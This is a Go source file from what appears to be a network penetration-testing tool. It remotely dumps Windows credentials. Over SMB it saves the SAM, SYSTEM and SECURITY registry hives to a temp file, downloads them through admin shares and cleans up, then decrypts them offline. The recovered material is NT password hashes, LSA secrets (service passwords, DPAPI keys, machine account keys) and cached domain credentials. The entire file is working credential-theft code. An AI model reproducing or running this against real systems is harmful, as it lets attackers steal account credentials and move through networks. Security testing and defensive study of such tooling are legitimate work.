package smb

import (
	"bytes"
	"context"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	smbfern "github.com/Method-Security/networkscan/generated/go/pentest/smb"
	"github.com/Method-Security/networkscan/internal/common/ntlm"
	"github.com/jfjallid/go-smb/dcerpc/msrrp"
	gosmb "github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/encoder"
	svc1log "github.com/palantir/witchcraft-go-logging/wlog/svclog/svc1log"
	"golang.org/x/crypto/md4"
)

// SaveAndDownloadHive saves a registry hive to a temp file on the target via RegSaveKey,
// downloads it over SMB, then cleans up. This works on Windows 11+ where direct
// remote registry reads of SAM/SECURITY are blocked.
func SaveAndDownloadHive(ctx context.Context, session *gosmb.Connection, rpccon *msrrp.RPCCon, hklm []byte, hiveName string) ([]byte, error) {
	log := svc1log.FromContext(ctx)

	// Open the top-level hive key (e.g. "SAM", "SYSTEM", "SECURITY")
	hSubKey, err := rpccon.OpenSubKeyExt(hklm, hiveName, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	if err != nil {
		hSubKey, err = rpccon.OpenSubKey(hklm, hiveName)
		if err != nil {
			return nil, fmt.Errorf("failed to open %s key: %v", hiveName, err)
		}
	}
	defer func() { _ = rpccon.CloseKeyHandle(hSubKey) }()

	// Generate unique temp filename
	tempName := fmt.Sprintf("ns%08x.tmp", uint32(time.Now().UnixNano()))
	tempPath := fmt.Sprintf(`C:\Windows\Temp\%s`, tempName)

	log.Info("Saving registry hive via RegSaveKey",
		svc1log.SafeParam("hive", hiveName),
		svc1log.SafeParam("tempPath", tempPath))

	err = rpccon.RegSaveKey(hSubKey, tempPath, "")
	if err != nil {
		return nil, fmt.Errorf("RegSaveKey failed for %s: %v", hiveName, err)
	}

	// Download via SMB admin share and clean up
	var hiveData []byte
	var downloadErr error

	// Try C$ first, then ADMIN$
	shares := []struct {
		name string
		path string
	}{
		{"C$", fmt.Sprintf(`Windows\Temp\%s`, tempName)},
		{"ADMIN$", fmt.Sprintf(`Temp\%s`, tempName)},
	}

	for _, share := range shares {
		var buf bytes.Buffer
		downloadErr = session.RetrieveFile(share.name, share.path, 0, func(data []byte) (int, error) {
			return buf.Write(data)
		})
		if downloadErr == nil {
			hiveData = buf.Bytes()
			// Delete temp file through same share
			_ = session.DeleteFile(share.name, share.path)
			break
		}
		log.Info("Failed to download hive via share, trying next",
			svc1log.SafeParam("share", share.name),
			svc1log.SafeParam("error", downloadErr.Error()))
	}

	if downloadErr != nil {
		// Best-effort cleanup: try to delete the temp file through each share
		for _, share := range shares {
			if delErr := session.DeleteFile(share.name, share.path); delErr == nil {
				log.Info("Cleaned up temp hive file after download failure", svc1log.SafeParam("share", share.name))
				break
			}
		}
		return nil, fmt.Errorf("failed to download %s hive from all shares: %v", hiveName, downloadErr)
	}

	log.Info("Downloaded registry hive",
		svc1log.SafeParam("hive", hiveName),
		svc1log.SafeParam("size", len(hiveData)))

	return hiveData, nil
}

// DumpSAMFromHives extracts SAM secrets from downloaded SYSTEM and SAM hive files.
func DumpSAMFromHives(ctx context.Context, systemData, samData []byte) ([]*smbfern.SamSecret, []string, error) {
	log := svc1log.FromContext(ctx)
	var results []*smbfern.SamSecret
	var errors []string

	systemHive, err := ParseRegistryHive(systemData)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to parse SYSTEM hive: %v", err)
	}
	samHive, err := ParseRegistryHive(samData)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to parse SAM hive: %v", err)
	}

	bootKey, err := getBootKeyFromHive(systemHive)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to extract boot key: %v", err)
	}
	log.Info("Extracted boot key from SYSTEM hive", svc1log.SafeParam("keyLen", len(bootKey)))

	sysKey, err := getSysKeyFromHive(samHive, bootKey)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to extract syskey: %v", err)
	}
	log.Info("Extracted syskey from SAM hive")

	// Determine OS build for hash format detection
	osBuild := getOSBuildFromHive(systemHive)

	samRoot, err := samHive.RootKey()
	if err != nil {
		return nil, nil, err
	}

	usersKey, err := samRoot.OpenSubKey(`SAM\Domains\Account\Users`)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to open Users key: %v", err)
	}

	subkeys, err := usersKey.Subkeys()
	if err != nil {
		return nil, nil, err
	}

	for _, sk := range subkeys {
		if strings.EqualFold(sk.Name, "Names") {
			continue
		}
		ridBytes, err := hex.DecodeString(sk.Name)
		if err != nil {
			continue
		}
		if len(ridBytes) != 4 {
			continue
		}
		rid := binary.BigEndian.Uint32(ridBytes)

		vVal, err := sk.GetValue("V")
		if err != nil {
			errors = append(errors, fmt.Sprintf("Failed to read V for RID %d: %v", rid, err))
			continue
		}
		data := vVal.Data
		if len(data) < 0xCC {
			errors = append(errors, fmt.Sprintf("V value too short for RID %d", rid))
			continue
		}

		offsetName := binary.LittleEndian.Uint32(data[0x0c:]) + 0xcc
		szName := binary.LittleEndian.Uint32(data[0x10:])
		if int(offsetName+szName) > len(data) {
			continue
		}
		username, err := encoder.FromUnicodeString(data[offsetName : offsetName+szName])
		if err != nil {
			continue
		}

		samSecret := &smbfern.SamSecret{
			Username: username,
			Rid:      int(rid),
		}

		szNT := binary.LittleEndian.Uint32(data[0xac:])
		offsetHashStruct := binary.LittleEndian.Uint32(data[0xa8:]) + 0xcc

		if szNT == 0 {
			samSecret.NtHash = "<empty>"
			lmHash := "<empty>"
			samSecret.LmHash = &lmHash
			results = append(results, samSecret)
			continue
		}

		var encHash, iv []byte
		var useAES bool

		if osBuild < 14393 && szNT == 0x14 {
			offsetNTHash := offsetHashStruct + 4
			if int(offsetNTHash+16) > len(data) {
				continue
			}
			encHash = data[offsetNTHash : offsetNTHash+16]
			useAES = false
		} else if osBuild >= 14393 {
			if szNT == 0x14 {
				offsetNTHash := offsetHashStruct + 4
				if int(offsetNTHash+16) > len(data) {
					continue
				}
				encHash = data[offsetNTHash : offsetNTHash+16]
				useAES = false
			} else if szNT == 0x38 {
				offsetIV := offsetHashStruct + 8
				offsetNTHash := offsetHashStruct + 24
				if int(offsetNTHash+16) > len(data) || int(offsetIV+16) > len(data) {
					continue
				}
				encHash = data[offsetNTHash : offsetNTHash+16]
				iv = data[offsetIV : offsetIV+16]
				useAES = true
			} else {
				samSecret.NtHash = "<empty>"
				lmHash := "<empty>"
				samSecret.LmHash = &lmHash
				results = append(results, samSecret)
				continue
			}
		} else {
			continue
		}

		var hash []byte
		if useAES {
			hash, err = DecryptAESHash(encHash, iv, sysKey, rid)
		} else {
			hash, err = DecryptRC4Hash(encHash, sysKey, rid)
		}
		if err != nil {
			errors = append(errors, fmt.Sprintf("Failed to decrypt hash for %s: %v", username, err))
			continue
		}

		samSecret.NtHash = fmt.Sprintf("%x", hash)
		lmHash := ntlm.StandardLMHash
		samSecret.LmHash = &lmHash

		results = append(results, samSecret)
		log.Info("Extracted SAM hash (offline)",
			svc1log.SafeParam("username", username),
			svc1log.SafeParam("rid", rid))
	}

	return results, errors, nil
}

// DumpLSAFromHives extracts LSA secrets from downloaded SYSTEM and SECURITY hive files.
func DumpLSAFromHives(ctx context.Context, systemData, securityData []byte) ([]*smbfern.LsaSecret, []string, error) {
	log := svc1log.FromContext(ctx)
	var results []*smbfern.LsaSecret
	var errors []string

	systemHive, err := ParseRegistryHive(systemData)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to parse SYSTEM hive: %v", err)
	}
	securityHive, err := ParseRegistryHive(securityData)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to parse SECURITY hive: %v", err)
	}

	bootKey, err := getBootKeyFromHive(systemHive)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to extract boot key: %v", err)
	}

	lsaKey, vistaStyle, err := getLSAKeyFromHive(securityHive, bootKey)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to extract LSA key: %v", err)
	}

	log.Info("Extracted LSA key from SECURITY hive",
		svc1log.SafeParam("vistaStyle", vistaStyle),
		svc1log.SafeParam("keyLen", len(lsaKey)))

	// Extract secrets
	secRoot, err := securityHive.RootKey()
	if err != nil {
		return nil, nil, err
	}

	secretsKey, err := secRoot.OpenSubKey(`Policy\Secrets`)
	if err != nil {
		errors = append(errors, fmt.Sprintf("Failed to open Secrets key: %v", err))
		// Continue to try cached creds
	} else {
		secretSubkeys, err := secretsKey.Subkeys()
		if err != nil {
			errors = append(errors, fmt.Sprintf("Failed to list secrets: %v", err))
		} else {
			for _, sk := range secretSubkeys {
				if sk.Name == "NL$Control" {
					continue
				}
				currValKey, err := sk.OpenSubKey("CurrVal")
				if err != nil {
					continue
				}
				defVal, err := currValKey.GetDefaultValue()
				if err != nil {
					continue
				}
				value := defVal.Data
				if len(value) == 0 || value[0] != 0x0 {
					continue
				}
				if !vistaStyle {
					continue
				}

				record := &lsaSecret{}
				if err := record.unmarshal(value); err != nil {
					continue
				}
				if len(record.EncryptedData) < 32 {
					continue
				}
				tmpKey := SHA256(lsaKey, record.EncryptedData[:32], 0)
				plainText, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
				if err != nil {
					continue
				}
				record2 := &lsaSecretBlob{}
				record2.unmarshal(plainText)

				ps := parseSecretFromHive(systemHive, sk.Name, record2.Secret)
				if ps == nil {
					continue
				}
				results = appendLSASecret(results, ps, log, sk.Name)
			}
		}
	}

	// Extract cached domain credentials
	cachedHashes := getCachedHashesFromHive(ctx, securityHive, bootKey, lsaKey, vistaStyle)
	if len(cachedHashes) > 0 {
		var entries []*smbfern.LsaSecretEntry
		for _, h := range cachedHashes {
			clean := strings.ReplaceAll(h, "\u0000", "")
			if parts := strings.SplitN(clean, ":", 2); len(parts) == 2 {
				entries = append(entries, &smbfern.LsaSecretEntry{Key: parts[0], Value: parts[1]})
			} else {
				entries = append(entries, &smbfern.LsaSecretEntry{Key: "Cached hash", Value: clean})
			}
		}
		if len(entries) > 0 {
			results = append(results, &smbfern.LsaSecret{
				Name:    "[*] Cached Domain Credentials",
				Entries: entries,
			})
		}
	}

	return results, errors, nil
}

// appendLSASecret converts a PrintableLSASecret to Fern type and appends to results.
func appendLSASecret(results []*smbfern.LsaSecret, ps *PrintableLSASecret, log svc1log.Logger, name string) []*smbfern.LsaSecret {
	var entries []*smbfern.LsaSecretEntry
	for _, secretStr := range ps.secrets {
		if strings.Contains(secretStr, ": ") {
			parts := strings.SplitN(secretStr, ": ", 2)
			entries = append(entries, &smbfern.LsaSecretEntry{Key: parts[0], Value: parts[1]})
		} else if strings.Contains(secretStr, ":") {
			parts := strings.SplitN(secretStr, ":", 3)
			if len(parts) == 3 {
				entries = append(entries, &smbfern.LsaSecretEntry{Key: parts[0] + ":" + parts[1], Value: parts[2]})
			} else if len(parts) == 2 {
				entries = append(entries, &smbfern.LsaSecretEntry{Key: parts[0], Value: parts[1]})
			} else {
				entries = append(entries, &smbfern.LsaSecretEntry{Key: "", Value: secretStr})
			}
		} else {
			entries = append(entries, &smbfern.LsaSecretEntry{Key: "", Value: secretStr})
		}
	}
	if ps.extraSecret != "" {
		parts := strings.SplitN(ps.extraSecret, ":", 3)
		if len(parts) == 3 {
			entries = append(entries, &smbfern.LsaSecretEntry{Key: parts[0] + ":" + parts[1], Value: parts[2]})
		} else if len(parts) == 2 {
			entries = append(entries, &smbfern.LsaSecretEntry{Key: parts[0], Value: parts[1]})
		} else {
			entries = append(entries, &smbfern.LsaSecretEntry{Key: "", Value: ps.extraSecret})
		}
	}
	if len(entries) > 0 {
		results = append(results, &smbfern.LsaSecret{Name: ps.secretType, Entries: entries})
		log.Info("Extracted LSA secret (offline)", svc1log.SafeParam("name", name))
	}
	return results
}

// --- Internal helpers ---

func getBootKeyFromHive(hive *RegistryHive) ([]byte, error) {
	root, err := hive.RootKey()
	if err != nil {
		return nil, err
	}

	// Find current control set number
	selectKey, err := root.OpenSubKey("Select")
	if err != nil {
		return nil, fmt.Errorf("failed to open Select key: %v", err)
	}
	current, err := selectKey.GetValueDWORD("Current")
	if err != nil {
		return nil, fmt.Errorf("failed to read Select\\Current: %v", err)
	}
	controlSet := fmt.Sprintf("ControlSet%03d", current)

	p := []byte{0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}
	scrambledKey := make([]byte, 0, 16)

	for _, keyName := range []string{"JD", "Skew1", "GBG", "Data"} {
		path := fmt.Sprintf(`%s\Control\Lsa\%s`, controlSet, keyName)
		key, err := root.OpenSubKey(path)
		if err != nil {
			return nil, fmt.Errorf("failed to open %s: %v", path, err)
		}
		className := key.ClassName()
		if className == "" {
			return nil, fmt.Errorf("empty class name for %s", path)
		}
		classBytes, err := hex.DecodeString(className)
		if err != nil {
			return nil, fmt.Errorf("failed to decode class name hex %q for %s: %v", className, path, err)
		}
		scrambledKey = append(scrambledKey, classBytes...)
	}

	if len(scrambledKey) < 16 {
		return nil, fmt.Errorf("scrambled key too short: %d bytes", len(scrambledKey))
	}

	result := make([]byte, 16)
	for i := 0; i < 16; i++ {
		result[i] = scrambledKey[p[i]]
	}
	return result, nil
}

func getSysKeyFromHive(samHive *RegistryHive, bootKey []byte) ([]byte, error) {
	root, err := samHive.RootKey()
	if err != nil {
		return nil, err
	}

	acctKey, err := root.OpenSubKey(`SAM\Domains\Account`)
	if err != nil {
		return nil, fmt.Errorf("failed to open Account key: %v", err)
	}
	fVal, err := acctKey.GetValue("F")
	if err != nil {
		return nil, fmt.Errorf("failed to read Account\\F: %v", err)
	}

	f := &domainAccountF{}
	if err = f.unmarshal(fVal.Data); err != nil {
		return nil, err
	}

	sysKey := make([]byte, 16)
	if f.Revision == 3 {
		samAesData := samKeyDataAes{}
		if err = binary.Read(bytes.NewReader(f.Data), binary.LittleEndian, &samAesData); err != nil {
			return nil, err
		}
		tmpSysKey, err := DecryptAESSysKey(bootKey, samAesData.Data[:samAesData.DataLen], samAesData.Salt[:])
		if err != nil {
			return nil, err
		}
		copy(sysKey, tmpSysKey)
	} else if f.Revision == 2 {
		samData := &samKeyData{}
		if err = binary.Read(bytes.NewReader(f.Data), binary.LittleEndian, samData); err != nil {
			return nil, err
		}
		encSysKey := append(samData.Key[:], samData.Checksum[:]...)
		tmpSysKey, err := DecryptRC4SysKey(bootKey, encSysKey, samData.Salt[:])
		if err != nil {
			return nil, err
		}
		input := []byte{}
		input = append(input, tmpSysKey[:16]...)
		input = append(input, S2...)
		input = append(input, tmpSysKey[:16]...)
		input = append(input, S1...)
		checksum := md5.Sum(input)
		if !bytes.Equal(checksum[:], tmpSysKey[16:]) {
			return nil, fmt.Errorf("syskey checksum failed")
		}
		copy(sysKey, tmpSysKey[:16])
	} else {
		return nil, fmt.Errorf("unknown DOMAIN_ACCOUNT_F revision: %d", f.Revision)
	}

	return sysKey, nil
}

func getOSBuildFromHive(systemHive *RegistryHive) int {
	root, err := systemHive.RootKey()
	if err != nil {
		return 22000 // default to modern Windows
	}
	selectKey, err := root.OpenSubKey("Select")
	if err != nil {
		return 22000
	}
	current, err := selectKey.GetValueDWORD("Current")
	if err != nil {
		return 22000
	}

	// Try SOFTWARE first (won't be in SYSTEM hive), then try a heuristic
	// The CurrentVersion key is under HKLM\SOFTWARE, not SYSTEM.
	// Since we only have the SYSTEM hive, we default to modern build to use AES path.
	// This is safe: AES format detection is based on szNT field, not build alone.
	_ = current
	return 22000
}

func getLSAKeyFromHive(securityHive *RegistryHive, bootKey []byte) ([]byte, bool, error) {
	root, err := securityHive.RootKey()
	if err != nil {
		return nil, false, err
	}

	// Try Vista+ PolEKList first
	vistaStyle := true
	polKey, err := root.OpenSubKey(`Policy\PolEKList`)
	if err != nil {
		vistaStyle = false
		polKey, err = root.OpenSubKey(`Policy\PolSecretEncryptionKey`)
		if err != nil {
			return nil, false, fmt.Errorf("failed to find LSA key (tried PolEKList and PolSecretEncryptionKey): %v", err)
		}
	}

	defVal, err := polKey.GetDefaultValue()
	if err != nil {
		return nil, false, fmt.Errorf("failed to read LSA key value: %v", err)
	}

	data := defVal.Data
	if len(data) == 0 {
		return nil, false, fmt.Errorf("empty LSA key data")
	}

	var lsaKey []byte
	if vistaStyle {
		lsaSecretRec := &lsaSecret{}
		if err := lsaSecretRec.unmarshal(data); err != nil {
			return nil, false, fmt.Errorf("failed to unmarshal LSA secret: %v", err)
		}
		encData := lsaSecretRec.EncryptedData
		if len(encData) < 32 {
			return nil, false, fmt.Errorf("LSA encrypted data too short: %d", len(encData))
		}
		tmpKey := SHA256(bootKey, encData[:32], 0)
		plainText, err := DecryptAES(tmpKey, encData[32:], nil)
		if err != nil {
			return nil, false, err
		}
		blob := &lsaSecretBlob{}
		blob.unmarshal(plainText)
		if len(blob.Secret) < 84 {
			return nil, false, fmt.Errorf("LSA secret blob too short for key: %d", len(blob.Secret))
		}
		lsaKey = blob.Secret[52:84]
	} else {
		h := md5.New()
		h.Write(bootKey)
		for i := 0; i < 1000; i++ {
			h.Write(data[60:76])
		}
		tmpKey := h.Sum(nil)
		c1, err := rc4.NewCipher(tmpKey[:])
		if err != nil {
			return nil, false, err
		}
		plaintext := make([]byte, 48)
		c1.XORKeyStream(plaintext, data[12:60])
		lsaKey = plaintext[0x10:0x20]
	}

	return lsaKey, vistaStyle, nil
}

func parseSecretFromHive(systemHive *RegistryHive, name string, secretItem []byte) *PrintableLSASecret {
	if len(secretItem) < 2 {
		return nil
	}
	if bytes.Equal(secretItem[:2], []byte{0, 0}) {
		return nil
	}

	upperName := strings.ToUpper(name)
	result := &PrintableLSASecret{secretType: "[*] " + name}

	if strings.HasPrefix(upperName, "_SC_") {
		secretDecoded, err := encoder.FromUnicodeString(secretItem)
		if err != nil {
			return nil
		}
		svcUser := getServiceUserFromHive(systemHive, name[4:])
		result.secrets = append(result.secrets, fmt.Sprintf("%s: %s", svcUser, secretDecoded))
	} else if strings.HasPrefix(upperName, "ASPNET_WP_PASSWORD") {
		secretDecoded, err := encoder.FromUnicodeString(secretItem)
		if err != nil {
			return nil
		}
		result.secrets = append(result.secrets, fmt.Sprintf("ASPNET: %s", secretDecoded))
	} else if strings.HasPrefix(upperName, "DPAPI_SYSTEM") {
		dpapi := &dpapiSystem{}
		if err := dpapi.unmarshal(secretItem); err != nil {
			return nil
		}
		result.secrets = append(result.secrets, fmt.Sprintf("dpapi_machinekey: 0x%x", dpapi.MachineKey))
		result.secrets = append(result.secrets, fmt.Sprintf("dpapi_userkey: 0x%x", dpapi.UserKey))
	} else if strings.HasPrefix(upperName, "$MACHINE.ACC") {
		h := md4.New()
		h.Write(secretItem)
		hostname, domain := getHostnameAndDomainFromHive(systemHive)
		printname := "$MACHINE.ACC"
		if hostname != "" {
			printname = strings.ToUpper(hostname) + "$"
		}
		result.secrets = append(result.secrets, fmt.Sprintf("%s (NT Hash): %x", printname, h.Sum(nil)))
		if domain != "" {
			aes128Key, aes256Key, err := CalcMachineAESKeys(hostname, domain, secretItem)
			if err == nil {
				result.secrets = append(result.secrets, fmt.Sprintf("%s:AES_128_key:%x", printname, aes128Key))
				result.secrets = append(result.secrets, fmt.Sprintf("%s:AES_256_key:%x", printname, aes256Key))
			}
		}
		result.extraSecret = fmt.Sprintf("%s:plain_password_hex:%x", printname, secretItem)
	} else if strings.HasPrefix(upperName, "NL$KM") {
		if len(secretItem) >= 16 {
			result.secrets = append(result.secrets, fmt.Sprintf("NL$KM: 0x%x", secretItem[:16]))
		}
	} else if strings.HasPrefix(upperName, "CACHEDDEFAULTPASSWORD") {
		secretDecoded, err := encoder.FromUnicodeString(secretItem)
		if err != nil {
			return nil
		}
		result.secrets = append(result.secrets, fmt.Sprintf("(Unknown user): %s", secretDecoded))
	}

	if len(result.secrets) == 0 && result.extraSecret == "" {
		return nil
	}
	return result
}

func getServiceUserFromHive(systemHive *RegistryHive, serviceName string) string {
	root, err := systemHive.RootKey()
	if err != nil {
		return "(unknown user)"
	}
	selectKey, err := root.OpenSubKey("Select")
	if err != nil {
		return "(unknown user)"
	}
	current, err := selectKey.GetValueDWORD("Current")
	if err != nil {
		return "(unknown user)"
	}
	path := fmt.Sprintf(`ControlSet%03d\Services\%s`, current, serviceName)
	svcKey, err := root.OpenSubKey(path)
	if err != nil {
		return "(unknown user)"
	}
	objName, err := svcKey.GetValueString("ObjectName")
	if err != nil {
		return "(unknown user)"
	}
	if strings.HasPrefix(objName, ".\\") {
		objName = objName[2:]
	}
	return objName
}

func getHostnameAndDomainFromHive(systemHive *RegistryHive) (hostname, domain string) {
	root, err := systemHive.RootKey()
	if err != nil {
		return "", ""
	}
	selectKey, err := root.OpenSubKey("Select")
	if err != nil {
		return "", ""
	}
	current, err := selectKey.GetValueDWORD("Current")
	if err != nil {
		return "", ""
	}
	path := fmt.Sprintf(`ControlSet%03d\Services\Tcpip\Parameters`, current)
	tcpKey, err := root.OpenSubKey(path)
	if err != nil {
		return "", ""
	}
	hostname, _ = tcpKey.GetValueString("Hostname")
	domain, _ = tcpKey.GetValueString("Domain")
	return
}

func getCachedHashesFromHive(ctx context.Context, securityHive *RegistryHive, bootKey, lsaKey []byte, vistaStyle bool) []string {
	log := svc1log.FromContext(ctx)
	root, err := securityHive.RootKey()
	if err != nil {
		return nil
	}

	cacheKey, err := root.OpenSubKey(`Cache`)
	if err != nil {
		// Also try "Security\Cache" in case root is SECURITY
		cacheKey, err = root.OpenSubKey(`Security\Cache`)
		if err != nil {
			return nil
		}
	}

	values, err := cacheKey.Values()
	if err != nil {
		return nil
	}

	// Find NL$IterationCount
	iterCount := 10240
	for _, v := range values {
		if strings.EqualFold(v.Name, "NL$IterationCount") {
			if len(v.Data) >= 4 {
				ic := binary.LittleEndian.Uint32(v.Data[:4])
				if ic > 10240 {
					iterCount = int(ic & 0xfffffc00)
				} else if ic != 0 {
					iterCount = int(ic) * 1024
				}
			}
			break
		}
	}

	// Get NL$KM key for decrypting cached creds
	nlkmKey, err := getNLKMKeyFromHive(securityHive, lsaKey, vistaStyle)
	if err != nil {
		log.Info("Failed to get NL$KM key", svc1log.SafeParam("error", err.Error()))
		return nil
	}

	var result []string
	for _, v := range values {
		if strings.EqualFold(v.Name, "NL$Control") || strings.EqualFold(v.Name, "NL$IterationCount") {
			continue
		}
		data := v.Data
		if len(data) < 96 {
			continue
		}

		record := &nlRecord{}
		if err := record.unmarshal(data); err != nil {
			continue
		}
		if record.UserLength == 0 {
			continue
		}

		// Check IV is non-zero (entry contains encrypted data)
		nilIV := make([]byte, 16)
		if bytes.Equal(record.IV[:], nilIV) {
			continue
		}
		if record.Flags&1 != 1 {
			continue
		}

		// Decrypt using NL$KM key bytes [16:32] — matches original getNLKMSecretKey + DecryptAES pattern
		plaintext, err := DecryptAES(nlkmKey[16:32], record.EncryptedData, record.IV[:])
		if err != nil {
			continue
		}
		if len(plaintext) < 0x48+int(record.UserLength) {
			continue
		}

		// encHash is first 16 bytes of decrypted data
		encHash := plaintext[:0x10]
		// User data starts at offset 0x48
		userData := plaintext[0x48:]

		if len(userData) < int(record.UserLength) {
			continue
		}
		username, err := encoder.FromUnicodeString(userData[:record.UserLength])
		if err != nil {
			continue
		}

		// Skip past username (padded) + domain name (padded) to get DNS domain
		offset := padDWORD(uint64(record.UserLength)) + padDWORD(uint64(record.DomainNameLength))
		if int(offset)+int(record.DNSDomainNameLength) > len(userData) {
			continue
		}
		dnsDomain, err := encoder.FromUnicodeString(userData[offset : offset+uint64(record.DNSDomainNameLength)])
		if err != nil {
			continue
		}

		if username == "" {
			continue
		}

		hashStr := fmt.Sprintf("%s/%s:$DCC2$%d#%s#%x",
			strings.ToUpper(dnsDomain), strings.ToLower(username),
			iterCount, strings.ToLower(username), encHash)

		result = append(result, hashStr)
		log.Info("Extracted cached credential (offline)", svc1log.SafeParam("username", username))
	}
	return result
}

// getNLKMKeyFromHive returns the raw decrypted NL$KM data (matching the global NLKMKey behavior).
// The caller should use bytes [16:32] as the actual decryption key for cached creds.
func getNLKMKeyFromHive(securityHive *RegistryHive, lsaKey []byte, vistaStyle bool) ([]byte, error) {
	root, err := securityHive.RootKey()
	if err != nil {
		return nil, err
	}

	nlkmKeyNode, err := root.OpenSubKey(`Policy\Secrets\NL$KM\CurrVal`)
	if err != nil {
		return nil, fmt.Errorf("NL$KM secret not found: %v", err)
	}

	defVal, err := nlkmKeyNode.GetDefaultValue()
	if err != nil {
		return nil, err
	}

	value := defVal.Data
	if len(value) == 0 || !vistaStyle {
		return nil, fmt.Errorf("NL$KM secret empty or pre-Vista")
	}

	record := &lsaSecret{}
	if err := record.unmarshal(value); err != nil {
		return nil, err
	}
	if len(record.EncryptedData) < 32 {
		return nil, fmt.Errorf("NL$KM encrypted data too short")
	}

	tmpKey := SHA256(lsaKey, record.EncryptedData[:32], 0)
	// Return raw decrypted data (NOT parsed via lsaSecretBlob)
	// Matches original getNLKMSecretKey behavior where NLKMKey = first 32 bytes of raw result
	rawResult, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
	if err != nil {
		return nil, err
	}
	if len(rawResult) < 32 {
		return nil, fmt.Errorf("NL$KM decrypted data too short: %d", len(rawResult))
	}
	result := make([]byte, 32)
	copy(result, rawResult[:32])
	return result, nil
}
